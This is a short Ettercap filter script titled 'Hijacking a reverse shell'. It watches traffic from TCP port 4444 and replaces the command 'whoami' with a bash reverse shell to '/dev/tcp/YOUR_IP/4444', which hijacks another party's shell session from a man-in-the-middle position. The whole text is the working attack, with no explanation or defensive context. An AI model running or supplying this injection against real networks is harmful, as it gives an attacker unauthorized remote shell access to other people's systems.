#Hijacking a reverse shell

if ( tcp.src == 4444 && search(DATA.data, "whoami")) {
	replace("whoami", "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1");
	msg("###### ETTERFILTER: substituted 'whoami' with reverse shell. ######\n");
}
